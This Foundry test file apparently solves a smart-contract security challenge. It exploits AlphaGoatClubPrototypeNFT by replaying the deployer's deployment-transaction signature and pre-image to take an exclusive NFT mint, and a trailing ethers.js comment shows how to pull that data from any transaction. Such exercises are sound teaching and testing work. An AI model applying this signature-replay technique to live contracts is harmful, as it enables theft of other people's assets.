// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {AlphaGoatClubPrototypeNFT} from "../src/AlphaGoatClub.sol";

pragma solidity ^0.8.0;

contract AlphaGoatClubTest is Test {
    AlphaGoatClubPrototypeNFT alphaGoatClub;

    // default keys for testing
    uint256 constant DEFAULT_ANVIL_PRIVATE_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address constant DEFAULT_ANVIL_ADDRESS = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    // explained below
    // computed from the transaction object
    bytes32 constant PRE_IMAGE = 0x08d2b49625e018e4b26a05952e4070fc56b69cb26244999171e42dc5854814af;

    // components of the signature
    bytes32 constant r = 0x79485724b75ceaa143550c1c7c201c4084d40856df946fdd4e29d02039d86fdd;
    bytes32 constant s = 0x0bece63c1eda1d63ed95d4e2951009c643fb43fced69c2a96c284e253b0e0794;
    uint8 constant v = 1 + 27;

    address attacker;

    function setUp() public {
        vm.startBroadcast(DEFAULT_ANVIL_PRIVATE_KEY);
        alphaGoatClub = new AlphaGoatClubPrototypeNFT();
        vm.stopBroadcast();
        attacker = makeAddr("attacker");
    }

    function testAlphaGoatClub() public {
        // recover signature and tx hash from contract creation, then call exclusiveBuy
        uint256 actualNonce = vm.getNonce(attacker);
        bytes memory signature = abi.encodePacked(r, s, v);
        vm.startPrank(attacker);
        //
        alphaGoatClub.commit();
        vm.roll(6);

        alphaGoatClub.exclusiveBuy(0, PRE_IMAGE, signature);
        vm.stopPrank();
        assertEq(alphaGoatClub.ownerOf(0), attacker);
        assert(vm.getNonce(attacker) < actualNonce + 3);
    }
}

/*

// Get the transaction object from the contract deployment
// Use ethers.js for this

const tx = transactionObject; // use eth_getTransactionByHash to get the transaction object
const { v, r, s } = tx;

// Convert r, s, and v to signature format
const rHex = ethers.utils.hexlify(r);
const sHex = ethers.utils.hexlify(s).slice(2);

const vHex = ethers.utils.hexlify(v + 27).slice(2); // add 27 so v is 27 or 28

// Concatenate r, s, and v to form the final signature
const signature = rHex + sHex + vHex;
console.log("Signature:", signature);
console.log(tx);


// for type 0 transactions
const baseTx = {
    chainId: tx.chainId,
    nonce: tx.nonce,
    gasPrice: tx.gasPrice,
    gasLimit: tx.gasLimit,
    to: tx.to,
    value: tx.value,
    data: tx.data,
};



// for type 2 transactions
const baseTx = {
    accessList: tx.accessList,
    type: tx.type,
    chainId: tx.chainId,
    maxFeePerGas: tx.maxFeePerGas,
    maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
    nonce: tx.nonce,
    gasLimit: tx.gasLimit,
    to: tx.to,
    value: tx.value,
    data: tx.data,
};

const unsignedTx = ethers.utils.serializeTransaction(baseTx);

// Get the transaction pre-image
const preimage = ethers.utils.keccak256(unsignedTx);
console.log("Preimage:", preimage);

*/
